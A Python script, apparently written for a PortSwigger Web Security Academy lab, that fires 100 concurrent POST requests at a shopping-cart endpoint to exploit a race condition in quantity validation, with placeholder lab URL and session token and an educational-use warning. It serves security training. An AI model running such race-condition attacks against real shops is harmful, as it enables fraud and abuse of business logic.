#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Example: Shopping Cart Race Condition Attack

This example demonstrates a race condition attack against shopping cart
functionality in web applications. The attack exploits timing vulnerabilities
to manipulate cart quantities beyond intended limits.

Lab Type: PortSwigger Web Security Academy - Race Conditions
Target: Shopping cart quantity validation
Technique: Concurrent HTTP POST requests

Author: Cybersecurity Student
Purpose: Educational - Master's Degree Exercise
"""

import asyncio
import aiohttp
import sys
import time
from typing import Dict

# =============================================================================
# EXAMPLE CONFIGURATION
# =============================================================================
# This is an example configuration. Update with your actual lab values.

# Target endpoint - UPDATE with your lab URL
URL = 'https://YOUR-LAB-ID.web-security-academy.net/cart'

# HTTP headers for the request
HEADERS: Dict[str, str] = {
    'Host': 'YOUR-LAB-ID.web-security-academy.net',
    'User-Agent': 'Mozilla/5.0 (Educational; Race Condition Lab) BurpSuite/1.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://YOUR-LAB-ID.web-security-academy.net',
    'Referer': 'https://YOUR-LAB-ID.web-security-academy.net/product?productId=1',
    'Upgrade-Insecure-Requests': '1',
}

# Session cookies - UPDATE with your session
COOKIES: Dict[str, str] = {
    'session': 'YOUR-SESSION-TOKEN'
}

# POST data for cart manipulation
DATA: Dict[str, str] = {
    'productId': '1',        # Product to add to cart
    'redir': 'PRODUCT',      # Redirect parameter
    'quantity': '99'         # Quantity to attempt adding
}

# Attack configuration
REQUEST_COUNT = 100          # Number of concurrent requests
CONNECTION_LIMIT = 30        # TCP connection pool limit
TIMEOUT = 15                 # Request timeout in seconds

# =============================================================================
# ATTACK IMPLEMENTATION
# =============================================================================

async def perform_cart_attack(session: aiohttp.ClientSession, request_id: int) -> Dict:
    """
    Perform a single cart manipulation request.
    
    Args:
        session: aiohttp ClientSession for making requests
        request_id: Unique identifier for this request
        
    Returns:
        Dictionary containing request results
    """
    try:
        start_time = time.time()
        
        async with session.post(
            URL, 
            headers=HEADERS, 
            cookies=COOKIES, 
            data=DATA
        ) as response:
            
            end_time = time.time()
            response_time = (end_time - start_time) * 1000  # Convert to milliseconds
            
            # Read response content
            content = await response.text()
            
            # Determine success indicators
            success_indicators = [
                'added to cart' in content.lower(),
                response.status == 200,
                'quantity' in content.lower()
            ]
            
            result = {
                'request_id': request_id,
                'status_code': response.status,
                'response_time': response_time,
                'content_length': len(content),
                'likely_success': any(success_indicators)
            }
            
            # Print real-time status
            status_emoji = "✅" if result['likely_success'] else "❌"
            print(
                f"[{request_id:03d}] {status_emoji} "
                f"Status: {response.status} | "
                f"Time: {response_time:.1f}ms | "
                f"Size: {len(content)} bytes"
            )
            
            return result
            
    except asyncio.TimeoutError:
        print(f"[{request_id:03d}] ⏰ TIMEOUT after {TIMEOUT}s")
        return {
            'request_id': request_id,
            'status_code': 0,
            'response_time': TIMEOUT * 1000,
            'content_length': 0,
            'likely_success': False,
            'error': 'timeout'
        }
        
    except Exception as e:
        print(f"[{request_id:03d}] 💥 ERROR: {str(e)}")
        return {
            'request_id': request_id,
            'status_code': 0,
            'response_time': 0,
            'content_length': 0,
            'likely_success': False,
            'error': str(e)
        }


async def run_race_condition_attack():
    """
    Execute the complete race condition attack.
    
    This function coordinates multiple concurrent requests to exploit
    timing vulnerabilities in cart quantity validation.
    """
    print("🛒 Shopping Cart Race Condition Attack")
    print("=" * 50)
    print(f"🎯 Target: {URL}")
    print(f"🔢 Concurrent requests: {REQUEST_COUNT}")
    print(f"🔗 Connection limit: {CONNECTION_LIMIT}")
    print(f"⏰ Timeout: {TIMEOUT}s")
    print(f"📦 Product ID: {DATA['productId']}")
    print(f"🔢 Quantity per request: {DATA['quantity']}")
    print("-" * 50)
    
    # Attack timing
    attack_start = time.time()
    
    # Configure HTTP client
    connector = aiohttp.TCPConnector(limit=CONNECTION_LIMIT)
    timeout = aiohttp.ClientTimeout(total=TIMEOUT)
    
    try:
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=timeout
        ) as session:
            
            # Create all attack tasks
            tasks = [
                perform_cart_attack(session, i) 
                for i in range(REQUEST_COUNT)
            ]
            
            # Execute all requests concurrently
            print("🚀 Launching concurrent requests...\n")
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
    except Exception as e:
        print(f"💥 Fatal error during attack: {e}")
        return
        
    finally:
        attack_end = time.time()
        attack_duration = attack_end - attack_start
        
        print("\n" + "=" * 50)
        print("📊 ATTACK SUMMARY")
        print("=" * 50)
        
        # Analyze results
        valid_results = [r for r in results if isinstance(r, dict)]
        successful_requests = [r for r in valid_results if r.get('likely_success', False)]
        
        print(f"⏱️  Total duration: {attack_duration:.2f} seconds")
        print(f"📤 Total requests: {REQUEST_COUNT}")
        print(f"📥 Valid responses: {len(valid_results)}")
        print(f"✅ Likely successful: {len(successful_requests)}")
        print(f"📈 Requests/second: {REQUEST_COUNT/attack_duration:.2f}")
        
        if successful_requests:
            avg_response_time = sum(r['response_time'] for r in successful_requests) / len(successful_requests)
            print(f"⚡ Avg response time: {avg_response_time:.1f}ms")
            
        # Status code distribution
        status_codes = {}
        for result in valid_results:
            code = result.get('status_code', 0)
            status_codes[code] = status_codes.get(code, 0) + 1
            
        print("\n📋 Status Code Distribution:")
        for code, count in sorted(status_codes.items()):
            percentage = (count / len(valid_results)) * 100
            print(f"   {code}: {count} requests ({percentage:.1f}%)")


def validate_example_config() -> bool:
    """
    Validate that the example configuration has been updated.
    
    Returns:
        True if config is valid, False if using default values
    """
    default_indicators = [
        'YOUR-LAB-ID' in URL,
        'YOUR-SESSION-TOKEN' in str(COOKIES.values()),
        URL == 'https://YOUR-LAB-ID.web-security-academy.net/cart'
    ]
    
    if any(default_indicators):
        print("⚠️  Configuration Error")
        print("This example uses placeholder values.")
        print("Please update the following:")
        print("  • URL: Replace YOUR-LAB-ID with actual lab ID")
        print("  • COOKIES: Replace YOUR-SESSION-TOKEN with real session")
        print("  • HEADERS: Update Host, Origin, Referer fields")
        return False
        
    return True


if __name__ == '__main__':
    print("🎓 Burp Suite Laboratory - Shopping Cart Race Condition")
    print("📚 Educational Example for Cybersecurity Studies")
    print()
    
    # Validate configuration
    if not validate_example_config():
        print("\n❌ Please update the configuration before running.")
        sys.exit(1)
    
    # Educational warning
    print("⚠️  EDUCATIONAL USE ONLY")
    print("This tool is for authorized laboratory testing only.")
    print("Ensure you have permission to test the target system.\n")
    
    try:
        asyncio.run(run_race_condition_attack())
        print("\n🎯 Race condition attack completed.")
        print("Review the results to understand the vulnerability.")
        
    except KeyboardInterrupt:
        print("\n⛔ Attack interrupted by user.")
        print("👋 Goodbye!")
        sys.exit(0)
        
    except Exception as e:
        print(f"\n💥 Unexpected error: {e}")
        sys.exit(1)

